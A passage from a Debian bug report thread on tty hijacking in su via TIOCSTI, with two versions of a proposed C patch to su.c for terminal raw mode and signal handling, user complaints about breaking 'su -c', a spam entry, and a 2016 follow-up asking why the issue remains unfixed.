    SIGTERM because according to the code the child might be
    SIGKILLed by kill_child() if the child is a shell which
    ignores SIGTERM.

@@ -434,31 +468,39 @@:
    Due the fact that we are not always retrieving a signal to
    be able to switch correct between the parents tty's raw and cooked
    mode I found the way just in using the process group id to differ
    between background and foreground operation but independent
    if the child process is stopped or running.

    Important is that the parents tty stays sane except the
    su session gets SIGKILLed.

@@ -491,76 +549,146 @@:

    I was letting the tty reset outside the loop because we would loose
    the reset if there would be an interrupt between setting to raw mode
    and running the main loop.

Sorry for the mess with spaces and tab's however, due the
fact that the source file was mixed already it would be
good to do a re-base either to spaces or tabs.

Based on:
    branch: su-c_tty
    commit ad1ecc897b4168f36ef0cb048ebea101015521c8

___BEGIN_PATCH___
diff --git a/src/su.c b/src/su.c
index 34f6771..63f239e 100644
--- a/src/su.c
+++ b/src/su.c
@@ -60,7 +60,6 @@
 #include <pwd.h>
 #include <signal.h>
 #include <stdio.h>
-#include <sys/time.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
@@ -220,6 +219,46 @@ static /*@noreturn@*/void su_failure (const char *tty, bool su_to_root)
 	exit (1);
 }

+static bool term_setattr( int fd, const struct termios *termset, bool hndl_sig) {
+
+    struct termios termset_new;
+    struct termios termset_check;
+
+	termset_new = *termset;
+	/* Set RAW mode  */
+	cfmakeraw( &termset_new);
+
+	if( hndl_sig)
+	    termset_new.c_lflag = ISIG;
+
+    if( tcsetattr( fd, TCSANOW, &termset_new) == -1) {
+        fprintf( stderr,
+                 _("%s: Cannot set raw mode\n"),
+                 Prog);
+        return false;
+    }
+
+    if( tcgetattr( fd, &termset_check) == -1) {
+        fprintf( stderr,
+                 _("%s: Cannot get terminal attributes\n"),
+                 Prog);
+        return false;
+    }
+
+    if( termset_new.c_iflag != termset_check.c_iflag ||
+        termset_new.c_oflag != termset_check.c_oflag ||
+        termset_new.c_cflag != termset_check.c_cflag ||
+        termset_new.c_lflag != termset_check.c_lflag ||
+        memcmp( &termset_new.c_cc, &termset_check.c_cc, NCCS) != 0) {
+
+        fprintf( stderr,
+                 _("%s: Could not set terminal attributes correctly\n"),
+                 Prog);
+        return false;
+    }
+    return true;
+}
+
 /*
  * execve_shell - Execute a shell with execve, or interpret it with
  * /bin/sh
@@ -280,19 +319,22 @@ static void handle_session (const struct passwd *pw)
 #endif				/* USE_PAM */
 	int fd_ptmx = -1;
 	int fd_pts = -1;
-	char *pts_name = NULL;
+	char *pts_name = NULL;
 	struct termios termset_save;
-	struct termios termset_new;
 	fd_set inp_fds;
 	struct timeval sel_to;
 	char trbuf[BUFSIZ];
 	ssize_t bytes_r;
 	struct winsize winsz;
 	bool winsz_set = false;
+	pid_t pg_pid = 0;
+	pid_t pg_pid_cmp = 0;
+	pid_t pg_pid_tmp = 0;

+	pg_pid = getpid();

-	if (isatty (0) == 1) {
+	if (isatty ( STDIN_FILENO) == 1) {
 		have_tty = true;

 		if (tcgetattr (STDIN_FILENO, &termset_save) == -1) {
@@ -360,14 +402,6 @@ static void handle_session (const struct passwd *pw)
 		if (have_tty) {
 			close (fd_ptmx);

-			if (tcsetattr (fd_pts, TCSANOW, &termset_save) == -1) {
-				fprintf (stderr,
-				         _("%s: Cannot set termios attributes of session\n"),
-				         Prog);
-				(void) close (fd_pts);
-				exit (1);
-			}
-
 			if (   winsz_set
 			    && (ioctl (fd_pts, TIOCSWINSZ, &winsz) == -1)) {
 				fprintf (stderr,
@@ -423,7 +457,7 @@ static void handle_session (const struct passwd *pw)
 		(void) fprintf (stderr,
 		                _("%s: signal malfunction\n"),
 		                Prog);
-		caught = SIGTERM;
+		caught = SIGHUP;
 	}
 	if (0 == caught) {
 		struct sigaction action;
@@ -434,31 +468,39 @@ static void handle_session (const struct passwd *pw)
 		sigemptyset (&ourset);

 		if (   (sigaddset (&ourset, SIGTERM) != 0)
+		    || (sigaddset (&ourset, SIGINT) != 0)
 		    || (sigaddset (&ourset, SIGALRM) != 0)
 		    || (sigaddset (&ourset, SIGWINCH) != 0)
+		    || (sigaddset (&ourset, SIGCONT) != 0)
+		    || (sigaddset (&ourset, SIGTSTP) != 0)
 		    || (sigaction (SIGTERM, &action, NULL) != 0)
+		    || (sigaction (SIGINT, &action, NULL) != 0)
 		    || (sigaction (SIGWINCH, &action, NULL) != 0)
-		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)) {
+		    || (sigaction (SIGCONT, &action, NULL) != 0)
+		    || (sigaction (SIGTSTP, &action, NULL) != 0)
+		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)
+		    ) {
 			fprintf (stderr,
 			         _("%s: signal masking malfunction\n"),
 			         Prog);
-			caught = SIGTERM;
+			caught = SIGHUP;
 		}
 	}

 	if ((0 == caught) && have_tty) {
-		/* Set RAW mode  */
-		termset_new = termset_save;
-		cfmakeraw (&termset_new);
-		if (tcsetattr (STDIN_FILENO, TCSANOW, &termset_new) != 0) {
-			/* FIXME: At least one change was successful.
-			 * Success should be checked with tcsetattr */
-			fprintf (stderr,
-			         _("%s: Cannot set terminal attributes: %s\n"),
-			         Prog, strerror (errno));
-			caught = -1;
-		}
-	}
+		if( (pg_pid_tmp = tcgetpgrp( STDIN_FILENO)) == -1) {
+			fprintf( stderr, _("%s: Cannot get process group id\n"), Prog);
+			caught = SIGHUP;
+		} else {
+			/* Set raw mode if running in foreground */
+			if( pg_pid_tmp == pg_pid) {
+				/* Set RAW mode  */
+                if( term_setattr( STDIN_FILENO, &termset_save, !doshell) == false)
+                    caught = SIGHUP;
+            }
+            pg_pid_cmp = pg_pid_tmp;
+        }
+    }

 	if (0 == caught) {
 		bool stop = true;
@@ -466,6 +508,7 @@ static void handle_session (const struct passwd *pw)
 		do {
 			pid_t pid;
 			stop = true;
+			errno = 0;

 			if (have_tty) {
 				pid = waitpid (-1, &status, WUNTRACED | WNOHANG);
@@ -473,16 +516,31 @@ static void handle_session (const struct passwd *pw)
 				pid = waitpid (-1, &status, WUNTRACED);
 			}

-			if (   ((pid_t)-1 != pid && !have_tty)
+			/* When interrupted by signal, the signal will be
+			 * forwarded to the child, and termination will be
+			 * forced later.
+			 */
+			if (   (((pid_t)-1 == pid) && (EINTR == errno) && (SIGTSTP == caught)) ||
+			        ((pid == (pid_t)0) && (SIGTSTP == caught))) {
+				/* Except for SIGTSTP, which request to
+				 * stop the child.
+				 * We will SIGSTOP ourself on the next
+				 * waitpid round.
+				 */
+				kill (pid_child, SIGSTOP);
+				stop = false;
+			} else if ( ((pid_t)0 < pid)
 			           && (0 != WIFSTOPPED (status))) {
 				/* The child (shell) was suspended.
 				 * Suspend su. */
-				kill (getpid (), WSTOPSIG (status));
+				kill (pg_pid, WSTOPSIG (status));
 				/* wake child when resumed */
 				kill (pid, SIGCONT);
 				stop = false;
-			} else if (pid == (pid_t)0 && have_tty) {
-				stop = false;
+			} else if ( pid >= (pid_t)0 && have_tty) {
+
+				if( pid == (pid_t)0)
+					stop = false;

 				if (caught == SIGWINCH) {
 					caught = 0;
@@ -491,76 +549,146 @@ static void handle_session (const struct passwd *pw)
 					}
 				}

+				/* Reset 'process group pid compare' to set STDIN to 'raw' again */
+				if( caught == SIGCONT) {
+					caught = 0;
+					pg_pid_cmp = 0;
+				}
+
+                /* Terminate the child with SIGHUP to be able
+                 * to terminate a shell running as command
+                 */
+				if( caught == SIGINT)
+					kill( -pid_child, SIGHUP);
+
+				/* If caught by any other signal then stop */
+				if( caught != 0)
+					stop = true;
+
 				FD_ZERO (&inp_fds);
 				FD_SET (STDIN_FILENO, &inp_fds);
 				FD_SET (fd_ptmx, &inp_fds);
 				sel_to = (struct timeval){ 0, 10000};

 				if (select (fd_ptmx + 1, &inp_fds, NULL, NULL, &sel_to) == -1) {
-					if (errno == EINTR) {
+					if (errno == EINTR && stop == false) {
 						continue;
 					}
 					stop = true;
+					errno = 0;
 				}
 				if (FD_ISSET (STDIN_FILENO, &inp_fds)) {
-					bytes_r = read (STDIN_FILENO, trbuf, BUFSIZ);
-					if (bytes_r <= 0) {
-						if (errno == EINTR) {
-							continue;
-						}
-						fprintf (stderr,
-						         _("%s: Failure in reading from stdin\r\n"),
-						         Prog);
+					/* Get process group pid to compare with last run */
+					if ( (pg_pid_tmp = tcgetpgrp( STDIN_FILENO)) == -1) {
+						fprintf( stderr,
+						         _("%s: Cannot get process group id: %s\n"),
+						         Prog, strerror( errno));
 						stop = true;
+                        errno = 0;
 					}
-
-					if (   (bytes_r > 0)
-					    && (write (fd_ptmx, trbuf, bytes_r) != bytes_r)) {
-						if (errno == EINTR || errno == EIO) {
-							/* FIXME: are we
-							 * loosing some
-							 * bytes here? */
-							continue;
+					else {
+
+						/* Running in foreground  if equal */
+						if( pg_pid_tmp == pg_pid) {
+
+							/* Set raw mode again if last run was in background */
+							if( pg_pid_cmp != pg_pid_tmp) {
+
+								/* Fetch term settings again because parent might have changed settings */
+								if( tcgetattr( STDIN_FILENO, &termset_save) == -1) {
+									fprintf( stderr,
+                                             _("%s: Cannot get termios attributes: %s\n"),
+                                             Prog, strerror( errno));
+									stop = true;
+                                    errno = 0;
+								}
+								else {
+									/* Set RAW mode  */
+                                    if( term_setattr( STDIN_FILENO, &termset_save, !doshell) ==
false) {
+                                        stop = true;
+                                        errno = 0;
+                                    }
+								}
+								pg_pid_cmp = pg_pid_tmp;
+							}
 						}
-						fprintf (stderr, _("%s: Failure in writing to session\r\n"), Prog);
-						stop = true;
 					}
+
+
+					bytes_r = read( STDIN_FILENO, trbuf, BUFSIZ);
+					if( bytes_r <= 0) {
+						if( errno != EINTR && errno != EIO) {
+							fprintf( stderr,
+                                     _("%s: Failure in reading from stdin: %s\r\n"),
+                                     Prog, strerror( errno));
+						    stop = true;
+                            errno = 0;
+                        }
+					}
+
+                    while( bytes_r > 0) {
+					    ret = write( fd_ptmx, trbuf, bytes_r);
+                        if( ret < 0) {
+						    if( errno != EINTR ) {
+						        fprintf( stderr,
+                                         _("%s: Failure in writing to session: %s\r\n"),
+                                        Prog, strerror( errno));
+						        stop = true;
+                                bytes_r = 0;
+                            }
+                            errno = 0;
+                        }
+                        else
+                            bytes_r -= ret;
+                    }
 				}

 				if (FD_ISSET (fd_ptmx, &inp_fds)) {
 					bytes_r = read (fd_ptmx, trbuf, BUFSIZ);
 					if (bytes_r <= 0) {
-						if (errno == EINTR || errno == EIO) {
-							continue;
-						}
-						fprintf (stderr,
-						         _("%s: Failure in reading from session: %s\r\n"),
-						         Prog, strerror (errno));
-						stop = true;
+						if (errno != EINTR && errno != EIO) {
+						    fprintf (stderr,
+						             _("%s: Failure in reading from session: %s\r\n"),
+						             Prog, strerror (errno));
+						    stop = true;
+                            errno = 0;
+                        }
 					}

-					if (bytes_r > 0 && write (STDOUT_FILENO, trbuf, bytes_r) != bytes_r) {
-						fprintf (stderr,
-						         _("%s: Failure in writing to stdout\r\n"),
-						         Prog);
-						stop = true;
-					}
+                    while( bytes_r > 0) {
+					    ret = write( STDOUT_FILENO, trbuf, bytes_r);
+                        if( ret < 0) {
+						    if( errno != EINTR ) {
+						        fprintf( stderr,
+                                         _("%s: Failure in writing to stdout: %s\r\n"),
+                                        Prog, strerror( errno));
+						        stop = true;
+                                bytes_r = 0;
+                            }
+                            errno = 0;
+                        }
+                        else
+                            bytes_r -= ret;
+                    }
 				}
-			}
-		} while (!stop);

-		if (have_tty) {
-			(void) close (fd_pts);
-			/* Reset RAW mode  */
-			if (tcsetattr (STDIN_FILENO, TCSANOW, &termset_save) == -1) {
-				fprintf (stderr,
-				         _("%s: Cannot reset termios attributes\n"),
-				         Prog);
-				/* caught not set */
+				if( pid == (pid_t)0 && caught == 0 && stop == true)
+					caught = SIGHUP;
 			}
-		}
+		} while (!stop);
 	}

+
+    if (have_tty) {
+        (void) close (fd_pts);
+        /* Reset RAW mode  */
+        if (tcsetattr (STDIN_FILENO, TCSANOW, &termset_save) == -1) {
+            fprintf (stderr,
+                     _("%s: Cannot reset termios attributes\n"),
+                     Prog);
+        }
+    }
+
 	if (0 != caught) {
 		(void) fputs ("\n", stderr);
 		(void) fputs (_("Session terminated, terminating shell..."),
@@ -1326,7 +1454,7 @@ int main (int argc, char **argv)
 		 * Use the shell and create an argv
 		 * with the rest of the command line included.
 		 */
-		argv[-1] = cp;
+		argv[-1] = (char *)cp;
 		execve_shell (shellstr, &argv[-1], environ);
 		err = errno;
 		(void) fprintf (stderr,
___END_PATCH___

Best regards
Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 15 Sep 2013 10:36:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=178), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=178), [link](#177)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 15 Sep 2013 10:36:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=180), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=180), [link](#179)).

---

[Message #181](#181) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=181), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=181), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: Nicolas François
<nicolas.francois@centraliens.net>
Cc: 663200@bugs.debian.org, Francois Gouget <fgouget@free.fr>,
Tim Connors <reportbug@rather.puzzling.org>,
628843@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#663200: Bug#628843: Bug#659878: cannot
set terminal process group (-1): Inappropriate ioctl for device
Date: Sun, 15 Sep 2013 12:34:09 +0200
```
Hi again,

Sorry, but I was submitting the wrong patch by mistake but
here now the right one:

___BEGIN_PATCH___
diff --git a/src/su.c b/src/su.c
index 34f6771..8053225 100644
--- a/src/su.c
+++ b/src/su.c
@@ -60,7 +60,6 @@
 #include <pwd.h>
 #include <signal.h>
 #include <stdio.h>
-#include <sys/time.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
@@ -220,6 +219,46 @@ static /*@noreturn@*/void su_failure (const char *tty, bool su_to_root)
 	exit (1);
 }

+static bool term_setattr( int fd, const struct termios *termset, bool hndl_sig) {
+
+    struct termios termset_new;
+    struct termios termset_check;
+
+	termset_new = *termset;
+	/* Set RAW mode  */
+	cfmakeraw( &termset_new);
+
+	if( hndl_sig)
+	    termset_new.c_lflag = ISIG;
+
+    if( tcsetattr( fd, TCSANOW, &termset_new) == -1) {
+        fprintf( stderr,
+                 _("%s: Cannot set raw mode\n"),
+                 Prog);
+        return false;
+    }
+
+    if( tcgetattr( fd, &termset_check) == -1) {
+        fprintf( stderr,
+                 _("%s: Cannot get terminal attributes\n"),
+                 Prog);
+        return false;
+    }
+
+    if( termset_new.c_iflag != termset_check.c_iflag ||
+        termset_new.c_oflag != termset_check.c_oflag ||
+        termset_new.c_cflag != termset_check.c_cflag ||
+        termset_new.c_lflag != termset_check.c_lflag ||
+        memcmp( &termset_new.c_cc, &termset_check.c_cc, NCCS) != 0) {
+
+        fprintf( stderr,
+                 _("%s: Could not set terminal attributes correctly\n"),
+                 Prog);
+        return false;
+    }
+    return true;
+}
+
 /*
  * execve_shell - Execute a shell with execve, or interpret it with
  * /bin/sh
@@ -280,19 +319,22 @@ static void handle_session (const struct passwd *pw)
 #endif				/* USE_PAM */
 	int fd_ptmx = -1;
 	int fd_pts = -1;
-	char *pts_name = NULL;
+	char *pts_name = NULL;
 	struct termios termset_save;
-	struct termios termset_new;
 	fd_set inp_fds;
 	struct timeval sel_to;
 	char trbuf[BUFSIZ];
 	ssize_t bytes_r;
 	struct winsize winsz;
 	bool winsz_set = false;
+	pid_t pg_pid = 0;
+	pid_t pg_pid_cmp = 0;
+	pid_t pg_pid_tmp = 0;

+	pg_pid = getpid();

-	if (isatty (0) == 1) {
+	if (isatty ( STDIN_FILENO) == 1) {
 		have_tty = true;

 		if (tcgetattr (STDIN_FILENO, &termset_save) == -1) {
@@ -360,14 +402,6 @@ static void handle_session (const struct passwd *pw)
 		if (have_tty) {
 			close (fd_ptmx);

-			if (tcsetattr (fd_pts, TCSANOW, &termset_save) == -1) {
-				fprintf (stderr,
-				         _("%s: Cannot set termios attributes of session\n"),
-				         Prog);
-				(void) close (fd_pts);
-				exit (1);
-			}
-
 			if (   winsz_set
 			    && (ioctl (fd_pts, TIOCSWINSZ, &winsz) == -1)) {
 				fprintf (stderr,
@@ -423,7 +457,7 @@ static void handle_session (const struct passwd *pw)
 		(void) fprintf (stderr,
 		                _("%s: signal malfunction\n"),
 		                Prog);
-		caught = SIGTERM;
+		caught = SIGHUP;
 	}
 	if (0 == caught) {
 		struct sigaction action;
@@ -434,31 +468,39 @@ static void handle_session (const struct passwd *pw)
 		sigemptyset (&ourset);

 		if (   (sigaddset (&ourset, SIGTERM) != 0)
+		    || (sigaddset (&ourset, SIGINT) != 0)
 		    || (sigaddset (&ourset, SIGALRM) != 0)
 		    || (sigaddset (&ourset, SIGWINCH) != 0)
+		    || (sigaddset (&ourset, SIGCONT) != 0)
+		    || (sigaddset (&ourset, SIGTSTP) != 0)
 		    || (sigaction (SIGTERM, &action, NULL) != 0)
+		    || (sigaction (SIGINT, &action, NULL) != 0)
 		    || (sigaction (SIGWINCH, &action, NULL) != 0)
-		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)) {
+		    || (sigaction (SIGCONT, &action, NULL) != 0)
+		    || (sigaction (SIGTSTP, &action, NULL) != 0)
+		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)
+		    ) {
 			fprintf (stderr,
 			         _("%s: signal masking malfunction\n"),
 			         Prog);
-			caught = SIGTERM;
+			caught = SIGHUP;
 		}
 	}

 	if ((0 == caught) && have_tty) {
-		/* Set RAW mode  */
-		termset_new = termset_save;
-		cfmakeraw (&termset_new);
-		if (tcsetattr (STDIN_FILENO, TCSANOW, &termset_new) != 0) {
-			/* FIXME: At least one change was successful.
-			 * Success should be checked with tcsetattr */
-			fprintf (stderr,
-			         _("%s: Cannot set terminal attributes: %s\n"),
-			         Prog, strerror (errno));
-			caught = -1;
-		}
-	}
+		if( (pg_pid_tmp = tcgetpgrp( STDIN_FILENO)) == -1) {
+			fprintf( stderr, _("%s: Cannot get process group id\n"), Prog);
+			caught = SIGHUP;
+		} else {
+			/* Set raw mode if running in foreground */
+			if( pg_pid_tmp == pg_pid) {
+				/* Set RAW mode  */
+                if( term_setattr( STDIN_FILENO, &termset_save, !doshell) == false)
+                    caught = SIGHUP;
+            }
+            pg_pid_cmp = pg_pid_tmp;
+        }
+    }

 	if (0 == caught) {
 		bool stop = true;
@@ -466,6 +508,7 @@ static void handle_session (const struct passwd *pw)
 		do {
 			pid_t pid;
 			stop = true;
+			errno = 0;

 			if (have_tty) {
 				pid = waitpid (-1, &status, WUNTRACED | WNOHANG);
@@ -473,16 +516,31 @@ static void handle_session (const struct passwd *pw)
 				pid = waitpid (-1, &status, WUNTRACED);
 			}

-			if (   ((pid_t)-1 != pid && !have_tty)
+			/* When interrupted by signal, the signal will be
+			 * forwarded to the child, and termination will be
+			 * forced later.
+			 */
+			if (   (((pid_t)-1 == pid) && (EINTR == errno) && (SIGTSTP == caught)) ||
+			        ((pid == (pid_t)0) && (SIGTSTP == caught))) {
+				/* Except for SIGTSTP, which request to
+				 * stop the child.
+				 * We will SIGSTOP ourself on the next
+				 * waitpid round.
+				 */
+				kill (pid_child, SIGSTOP);
+				stop = false;
+			} else if ( ((pid_t)0 < pid)
 			           && (0 != WIFSTOPPED (status))) {
 				/* The child (shell) was suspended.
 				 * Suspend su. */
-				kill (getpid (), WSTOPSIG (status));
+				kill (pg_pid, WSTOPSIG (status));
 				/* wake child when resumed */
 				kill (pid, SIGCONT);
 				stop = false;
-			} else if (pid == (pid_t)0 && have_tty) {
-				stop = false;
+			} else if ( pid >= (pid_t)0 && have_tty) {
+
+				if( pid == (pid_t)0)
+					stop = false;

 				if (caught == SIGWINCH) {
 					caught = 0;
@@ -491,76 +549,146 @@ static void handle_session (const struct passwd *pw)
 					}
 				}

+				/* Reset 'process group pid compare' to set STDIN to 'raw' again */
+				if( caught == SIGCONT) {
+					caught = 0;
+					pg_pid_cmp = 0;
+				}
+
+                /* Terminate the child with SIGHUP to be able
+                 * to terminate a shell running as command
+                 */
+				if( caught == SIGINT)
+					kill( -pid_child, SIGHUP);
+
+				/* If caught by any other signal then stop */
+				if( caught != 0)
+					stop = true;
+
 				FD_ZERO (&inp_fds);
 				FD_SET (STDIN_FILENO, &inp_fds);
 				FD_SET (fd_ptmx, &inp_fds);
 				sel_to = (struct timeval){ 0, 10000};

 				if (select (fd_ptmx + 1, &inp_fds, NULL, NULL, &sel_to) == -1) {
-					if (errno == EINTR) {
+					if (errno == EINTR && stop == false) {
 						continue;
 					}
 					stop = true;
+					errno = 0;
 				}
 				if (FD_ISSET (STDIN_FILENO, &inp_fds)) {
-					bytes_r = read (STDIN_FILENO, trbuf, BUFSIZ);
-					if (bytes_r <= 0) {
-						if (errno == EINTR) {
-							continue;
-						}
-						fprintf (stderr,
-						         _("%s: Failure in reading from stdin\r\n"),
-						         Prog);
+					/* Get process group pid to compare with last run */
+					if ( (pg_pid_tmp = tcgetpgrp( STDIN_FILENO)) == -1) {
+						fprintf( stderr,
+						         _("%s: Cannot get process group id: %s\n"),
+						         Prog, strerror( errno));
 						stop = true;
+                        errno = 0;
 					}
-
-					if (   (bytes_r > 0)
-					    && (write (fd_ptmx, trbuf, bytes_r) != bytes_r)) {
-						if (errno == EINTR || errno == EIO) {
-							/* FIXME: are we
-							 * loosing some
-							 * bytes here? */
-							continue;
+					else {
+
+						/* Running in foreground  if equal */
+						if( pg_pid_tmp == pg_pid) {
+
+							/* Set raw mode again if last run was in background */
+							if( pg_pid_cmp != pg_pid_tmp) {
+
+								/* Fetch term settings again because parent might have changed settings */
+								if( tcgetattr( STDIN_FILENO, &termset_save) == -1) {
+									fprintf( stderr,
+                                             _("%s: Cannot get termios attributes: %s\n"),
+                                             Prog, strerror( errno));
+									stop = true;
+                                    errno = 0;
+								}
+								else {
+									/* Set RAW mode  */
+                                    if( term_setattr( STDIN_FILENO, &termset_save, !doshell) ==
false) {
+                                        stop = true;
+                                        errno = 0;
+                                    }
+								}
+								pg_pid_cmp = pg_pid_tmp;
+							}
 						}
-						fprintf (stderr, _("%s: Failure in writing to session\r\n"), Prog);
-						stop = true;
 					}
+
+
+					bytes_r = read( STDIN_FILENO, trbuf, BUFSIZ);
+					if( bytes_r <= 0) {
+						if( errno != EINTR && errno != EIO && errno != 0) {
+							fprintf( stderr,
+                                     _("%s: Failure in reading from stdin: %s\r\n"),
+                                     Prog, strerror( errno));
+						    stop = true;
+                            errno = 0;
+                        }
+					}
+
+                    while( bytes_r > 0) {
+					    ret = write( fd_ptmx, trbuf, bytes_r);
+                        if( ret < 0) {
+						    if( errno != EINTR && errno != 0) {
+						        fprintf( stderr,
+                                         _("%s: Failure in writing to session: %s\r\n"),
+                                        Prog, strerror( errno));
+						        stop = true;
+                                bytes_r = 0;
+                            }
+                            errno = 0;
+                        }
+                        else
+                            bytes_r -= ret;
+                    }
 				}

 				if (FD_ISSET (fd_ptmx, &inp_fds)) {
 					bytes_r = read (fd_ptmx, trbuf, BUFSIZ);
 					if (bytes_r <= 0) {
-						if (errno == EINTR || errno == EIO) {
-							continue;
-						}
-						fprintf (stderr,
-						         _("%s: Failure in reading from session: %s\r\n"),
-						         Prog, strerror (errno));
-						stop = true;
+						if (errno != EINTR && errno != EIO && errno != 0) {
+						    fprintf (stderr,
+						             _("%s: Failure in reading from session: %s\r\n"),
+						             Prog, strerror (errno));
+						    stop = true;
+                            errno = 0;
+                        }
 					}

-					if (bytes_r > 0 && write (STDOUT_FILENO, trbuf, bytes_r) != bytes_r) {
-						fprintf (stderr,
-						         _("%s: Failure in writing to stdout\r\n"),
-						         Prog);
-						stop = true;
-					}
___END_PATCH___

Best regards
Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 05 Dec 2013 11:12:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=183), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=183), [link](#182)).

---

**Acknowledgement sent**
to `IgnorantGuru <ignorantguru@gmx.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 05 Dec 2013 11:12:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=185), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=185), [link](#184)).

---

[Message #186](#186) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=186), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=186), reply):

![](/cgi-bin/libravatar.cgi?email=ignorantguru%40gmx.com)
From: IgnorantGuru <ignorantguru@gmx.com>
To: 628843@bugs.debian.org
Subject: crippling su -c is very troubling - first bug reports
Date: Thu, 5 Dec 2013 04:09:50 -0700
```
I agree that simply crippling su -c is a very troubling 'solution' to this problem.  Obviously anyone can close a problem by simply crippling the program.

Bugs from so-called 'fixes' related to this in shadow are now appearing in my file manager, this one from a Slackware user:
<https://github.com/IgnorantGuru/spacefm/issues/394>

su doesn't even return an error message there, it silently ignores the -c command, making troubleshooting difficult.  In this case, the SpaceFM file manager allows the user to run quick commands as root, open a root terminal, etc.  The user selects the su front-end to use, such as su in a terminal, gksu, kdesu, etc.  All of these front-ends support running a command, and the shadow 4.1.5  'fix' seems to break all of them in some circumstances (without PAM?)  In that case, Slackware users are encountering it when KDE is not installed.
<http://seclists.org/oss-sec/2013/q2/374>

Thus far I have not seen a problem in Debian on this, and I hope Debian takes a more reasonable approach.  Red Hat is very heavy-handed in their so-called fixes and they cause widespread breakage (eg udev, etc).  Hardly a good example to follow.

I'm not following all the technical details here, but in your rush to close a hole, be mindful not to cause such breakage.  There aren't a lot of alternatives to su.  su is less secure by nature and we all know this - you assume some risk by using it.  Yet simply removing the functionality is not a viable solution.  The approach to this is not considering all use cases of the widely-used su program and the implications of merely crippling it.

Thanks for considering this carefully.  I think if you don't you're opening a pandora's box of more issues.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 28 Jun 2015 17:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=188), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=188), [link](#187)).

---

**Acknowledgement sent**
to `huiont5@gmail.com`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 28 Jun 2015 17:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=190), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=190), [link](#189)).

---

[Message #191](#191) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=191), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=191), reply):

![](/cgi-bin/libravatar.cgi?email=officewoxks287%40gmail.com)
From: "Rev.Schdrack T.Johnson" <officewoxks287@gmail.com>
To: officewoxks287@gmail.com
Subject: Good day my dear
Date: Sun, 28 Jun 2015 18:45:59 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=191) (text/plain, inline)]
```
```

```
```
[[WU.tif](bugreport.cgi?att=1;bug=628843;filename=WU.tif;msg=191) (image/tiff, attachment)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, simon@ruderich.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 01 Oct 2016 18:21:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=193), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=193), [link](#192)).

---

**Acknowledgement sent**
to `Simon Ruderich <he29heri@cip.cs.fau.de>`:

Extra info received and forwarded to list. Copy sent to `simon@ruderich.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 01 Oct 2016 18:21:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=195), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=195), [link](#194)).

---

[Message #196](#196) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=196), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=196), reply):

![](/cgi-bin/libravatar.cgi?email=he29heri%40cip.cs.fau.de)
From: Simon Ruderich <he29heri@cip.cs.fau.de>
To: Debian Bug Tracking System <628843@bugs.debian.org>
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Sat, 1 Oct 2016 20:17:12 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=196) (text/plain, inline)]
```
```
Package: login
Version: 1:4.2-3+deb8u1
Followup-For: Bug #628843

Hello,

Any news on this?

I'm deeply worried that this security issue in su was not fixed
since it was reported over 5 years ago! It still affects jessie
and sid. And the possible implications are not mentioned in the
man page.

As this breaks the use of su to change to less-privileged users,
what is the recommendation to perform this task without using su?

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x1972F726F0D556E7

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=196) (application/pgp-signature, inline)]
```

---

**Information forwarded**
